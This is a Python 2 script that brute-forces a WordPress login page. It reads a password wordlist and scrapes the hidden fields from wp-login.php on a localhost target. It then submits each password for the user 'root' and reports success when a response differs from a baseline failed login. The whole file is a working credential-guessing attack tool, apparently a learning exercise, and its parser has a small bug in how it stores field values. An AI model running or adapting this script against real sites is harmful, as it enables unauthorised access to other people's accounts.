import urllib2 
import urllib
import cookielib
import threading
import Queue

from HTMLParser import HTMLParser

# general settings
user_thread   = 1
username      = "root"
wordlist_file = "test.txt"
resume        = None

# target specific settings
target_url    = "http://localhost:90/wordpress/wp-login.php"
target_post   = "http://localhost:90/wordpress/wp-login.php"

username_field= "log"
password_field= "pwd"



class BruteParser(HTMLParser):
    #parser class
    def __init__(self):
        #declare field
        HTMLParser.__init__(self)
        self.tag_results = {}

    def handle_starttag(self, tag, attrs):
        #get specific list we want
        if tag == "input":
            tag_name  = None
            tag_value = None
            for name,value in attrs:
                if name == "name":
                    tag_name = value
                if name == "value":
                    tag_value = value
            
            if tag_name is not None:
                self.tag_results[tag_name] = value


class Bruter(object):
    #burter object
    def __init__(self, username, words,success_check):
        #bruter field
        self.username   = username
        self.password_q = words
        self.found      = False
        self.success_check = success_check
        
        print "Finished setting up for: %s" % username
        
    def run_bruteforce(self):
        #start running
        for i in range(user_thread):
            t = threading.Thread(target=self.web_bruter)
            t.start()

    def getfalse_result(self):
        #get false result for threshold
        t = self.web_bruter()
        return t


    def web_bruter(self):
        #make connection, dowload the html code, fill in test information, send code out,see the difference
        while not self.password_q.empty():
            brute = self.password_q.get().rstrip()
            jar = cookielib.FileCookieJar("cookies")
            opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(jar))
            
            response = opener.open(target_url)
            
            page = response.read()
            
            print "Trying: %s : %s (%d left)" % (self.username,brute,self.password_q.qsize())

            # parse out the hidden fields
            parser = BruteParser()
            parser.feed(page)     
            
            post_tags = parser.tag_results

            print(post_tags)
            # add our username and password fields
            post_tags[username_field] = self.username
            post_tags[password_field] = brute

            login_data = urllib.urlencode(post_tags)
            login_response = opener.open(target_post, login_data)
            login_result = login_response.read()
            #print(login_result)
            print(post_tags)

            #print(self.success_check)
            if self.success_check != hash(login_result) and not self.found:
                self.found = True
                print "[*] Bruteforce successful."
                print "[*] Username: %s" % username
                print "[*] Password: %s" % brute
                print "[*] Waiting for other threads to exit..."
        return hash(login_result)

def build_wordlist(wordlist_file):

    # read in the word list
    fd = open(wordlist_file,"rb") 
    raw_words = fd.readlines()
    fd.close()
    
    found_resume = False
    words        = Queue.Queue()
    
    for word in raw_words:
        
        word = word.rstrip()
        
        if resume is not None:
            
            if found_resume:
                words.put(word)
            else:
                if word == resume:
                    found_resume = True
                    print "Resuming wordlist from: %s" % resume
                                        
        else:
            words.put(word)
    return words

def main():
    words = build_wordlist(wordlist_file)
    q = Queue.Queue()
    q.put("a")
    temp = Bruter(username,q,"")
    temp.found = True
    success_check = temp.getfalse_result()

    print(success_check)
    bruter_obj = Bruter(username,words,success_check)
    bruter_obj.run_bruteforce()


main()

